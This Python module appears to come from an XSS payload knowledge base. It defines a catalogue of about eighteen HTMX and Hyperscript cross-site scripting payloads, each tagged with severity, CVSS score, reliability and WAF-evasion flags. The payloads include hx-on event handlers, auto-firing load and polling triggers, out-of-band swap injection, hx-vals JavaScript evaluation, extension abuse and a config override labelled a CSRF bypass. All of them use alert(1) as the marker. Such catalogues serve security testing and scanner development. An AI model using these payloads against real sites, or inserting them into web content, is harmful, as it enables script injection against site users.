#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

HTMX Framework XSS Payloads
HTMX uses hx-* attributes for AJAX interactions that can be exploited.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


HTMX_PAYLOADS = {
    # === hx-on Event Handlers ===
    "htmx-hx-on-click": PayloadEntry(
        payload='<button hx-on:click="alert(1)">Click</button>',
        contexts=["htmx", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX hx-on:click event handler",
        tags=["htmx", "framework", "hx-on", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "htmx-hx-on-load": PayloadEntry(
        payload='<div hx-on:load="alert(1)" hx-trigger="load">XSS</div>',
        contexts=["htmx", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.0,
        description="HTMX hx-on:load auto-execution",
        tags=["htmx", "framework", "hx-on", "load", "auto"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "htmx-hx-on-htmx-load": PayloadEntry(
        payload='<div hx-on::load="alert(1)">XSS</div>',
        contexts=["htmx", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.0,
        description="HTMX hx-on::load (htmx:load event)",
        tags=["htmx", "framework", "hx-on", "htmx-event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    # === hx-trigger Events ===
    "htmx-trigger-revealed": PayloadEntry(
        payload='<div hx-get="/x" hx-trigger="revealed" hx-on::before-request="alert(1)">XSS</div>',
        contexts=["htmx", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX revealed trigger with before-request event",
        tags=["htmx", "framework", "trigger", "revealed"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "htmx-trigger-intersect": PayloadEntry(
        payload='<div hx-get="/x" hx-trigger="intersect" hx-on::before-request="alert(1)">XSS</div>',
        contexts=["htmx", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX intersect trigger for viewport-based XSS",
        tags=["htmx", "framework", "trigger", "intersect"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "htmx-trigger-every": PayloadEntry(
        payload='<div hx-get="/x" hx-trigger="every 1s" hx-on::before-request="alert(1)">XSS</div>',
        contexts=["htmx", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX polling trigger for repeated XSS",
        tags=["htmx", "framework", "trigger", "polling"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    # === Response Processing ===
    "htmx-oob-swap": PayloadEntry(
        payload='<div hx-swap-oob="true" id="target"><img src=x onerror=alert(1)></div>',
        contexts=["htmx", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX out-of-band swap injection",
        tags=["htmx", "framework", "oob", "swap"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "htmx-response-script": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["htmx", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.0,
        description="HTMX response with script tag (if not sanitized)",
        tags=["htmx", "framework", "response", "script"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    # === hx-vals and hx-vars ===
    "htmx-hx-vals-injection": PayloadEntry(
        payload="<button hx-post=\"/x\" hx-vals='js:{x: alert(1)}'>Click</button>",
        contexts=["htmx", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX hx-vals JavaScript evaluation",
        tags=["htmx", "framework", "hx-vals", "js"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "htmx-hx-vars": PayloadEntry(
        payload='<button hx-post="/x" hx-vars="x:alert(1)">Click</button>',
        contexts=["htmx", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX hx-vars deprecated but still works",
        tags=["htmx", "framework", "hx-vars", "deprecated"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # === Extension Abuse ===
    "htmx-ext-client-side-templates": PayloadEntry(
        payload='<div hx-ext="client-side-templates" hx-get="/x" mustache-template><script>alert(1)</script></div>',
        contexts=["htmx", "html_content", "template"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX client-side-templates extension abuse",
        tags=["htmx", "framework", "extension", "template"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "htmx-ext-response-targets": PayloadEntry(
        payload='<div hx-ext="response-targets" hx-target-error="#err"><div id="err"></div></div>',
        contexts=["htmx", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="HTMX response-targets extension for error-based XSS",
        tags=["htmx", "framework", "extension", "error"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # === Custom Events ===
    "htmx-custom-event": PayloadEntry(
        payload='<div hx-on:myevent="alert(1)" id="t"></div><script>htmx.trigger("#t","myevent")</script>',
        contexts=["htmx", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="HTMX custom event triggering",
        tags=["htmx", "framework", "custom-event", "trigger"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "htmx-htmx-config": PayloadEntry(
        payload='<meta name="htmx-config" content=\'{"selfRequestsOnly":false}\'>',
        contexts=["htmx", "html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="HTMX config override for CSRF bypass",
        tags=["htmx", "framework", "config", "csrf"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # === Attribute Injection ===
    "htmx-attr-hx-get-js": PayloadEntry(
        payload='<div hx-get="javascript:alert(1)">XSS</div>',
        contexts=["htmx", "html_content", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="HTMX hx-get with javascript protocol (older versions)",
        tags=["htmx", "framework", "hx-get", "protocol"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "htmx-hx-headers": PayloadEntry(
        payload='<div hx-get="/x" hx-headers=\'{"X-XSS": "<script>alert(1)</script>"}\'>XSS</div>',
        contexts=["htmx", "html_content", "header"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="HTMX custom headers for header injection",
        tags=["htmx", "framework", "headers", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    # === Hyperscript Integration ===
    "htmx-hyperscript": PayloadEntry(
        payload='<button _="on click call alert(1)">Click</button>',
        contexts=["htmx", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Hyperscript (HTMX companion) event handler",
        tags=["htmx", "hyperscript", "framework", "event"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "htmx-hyperscript-load": PayloadEntry(
        payload='<div _="on load call alert(1)">XSS</div>',
        contexts=["htmx", "html_content"],
        severity=Severity.CRITICAL,
        cvss_score=8.0,
        description="Hyperscript on load auto-execution",
        tags=["htmx", "hyperscript", "framework", "auto"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

HTMX_PAYLOADS_TOTAL = len(HTMX_PAYLOADS)
